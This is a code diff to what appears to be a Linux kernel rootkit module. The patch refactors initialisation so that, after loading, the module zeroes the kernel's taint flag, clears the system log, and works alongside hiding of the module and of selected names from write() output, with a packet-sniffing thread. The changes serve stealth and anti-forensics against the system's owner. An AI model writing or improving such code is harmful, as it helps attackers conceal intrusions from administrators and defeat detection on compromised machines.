@@ -51,8 +51,6 @@ enum { PRC_RESET = -1, PRC_READ, PRC_DEC, PRC_TIMEOUT = _PRCTIMEOUT };
 
 struct task_struct *tsk_sniff = NULL;
 struct task_struct *tsk_prc = NULL;
-struct task_struct *tsk_tainted = NULL;
-static bool post_initmod_done;
 
 static struct proc_dir_entry *rrProcFileEntry;
 struct __lkmmod_t {
@@ -847,44 +845,11 @@ static int _proc_watchdog(void *unused)
 #endif
 }
 
-/**
- * Make sure /proc/sys/kernel/tainted is zeroed for
- * things that this module will annoy the kernel
- */
-static int _post_initmod(void *unused)
-{
-	struct kernel_syscalls *kaddr = (struct kernel_syscalls *)unused;
-
-	ssleep(2);
-
-	if (!kaddr) {
-		prerr("%s: taint fail.\n", __FUNCTION__);
-	} else {
-		kv_reset_tainted(kaddr->tainted);
-	}
-
-#ifndef DEBUG_RING_BUFFER
-	sys_do_syslog_clear();
-#endif
-
-	post_initmod_done = true;
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
-	kaddr->k_do_exit(0);
-#else
-	do_exit(0);
-#endif
-}
-
 static void _unroll_init(void)
 {
 	/** give time for any temporary thread
 	 * to finish */
 	ssleep(5);
-
-	if (tsk_tainted && !IS_ERR(tsk_tainted)) {
-		kthread_stop(tsk_tainted);
-	}
 
 	if (tsk_prc && !IS_ERR(tsk_prc)) {
 		kthread_unpark(tsk_prc);
@@ -902,9 +867,7 @@ static int __init kv_init(void)
 	int rv = 0;
 	char *procname_err = "";
 	const char **name;
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 	struct kernel_syscalls *kaddr = NULL;
-#endif
 
 	/*
      * Hide these names from write() fs output
@@ -935,24 +898,19 @@ static int __init kv_init(void)
 	if (!sys_init())
 		goto sys_init_error;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 	kaddr = kv_kall_load_addr();
-	if (!kaddr || !kaddr->k_do_exit)
-		goto cont;
+	if (!kaddr)
+		goto sys_init_error;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
+	if (!kaddr->k_do_exit)
+		goto sys_init_error;
 #endif
+
 	tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
 	if (!tsk_prc)
 		goto background_error;
 
-	/** short lived task */
-	tsk_tainted = kthread_run(_post_initmod, kv_kall_load_addr(),
-				  THREAD_POST_LOADING);
-	if (!tsk_tainted)
-		goto background_error;
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
-cont:
-#endif
 	/** Init crypto engine */
 	if (kv_crypto_engine_init() < 0) {
 		prerr("Failed to initialise crypto engine\n");
@@ -996,8 +954,15 @@ cont:
 	kv_hide_mod();
 #endif
 
+	kv_reset_tainted(kaddr->tainted);
+
 	prinfo("loaded.\n");
-	goto leave;
+
+#ifndef DEBUG_RING_BUFFER
+	sys_do_syslog_clear();
+#endif
+
+	return rv;
 
 crypto_error:
 	prerr("Crypto init error\n");
@@ -1016,22 +981,14 @@ procname_missing:
 error:
 	prerr("Unrolling\n");
 	_unroll_init();
-	rv = -EFAULT;
 
-leave:
-	return rv;
+	return -EFAULT;
 }
 
 static void __exit kv_cleanup(void)
 {
 	sys_deinit();
 	kv_pid_cleanup();
-
-	if (!post_initmod_done && tsk_tainted && !IS_ERR(tsk_tainted)) {
-		prinfo("stop tainted thread\n");
-		kthread_stop(tsk_tainted);
-		tsk_tainted = NULL;
-	}
 
 	if (tsk_sniff && !IS_ERR(tsk_sniff)) {
 		prinfo("stop sniff thread\n");
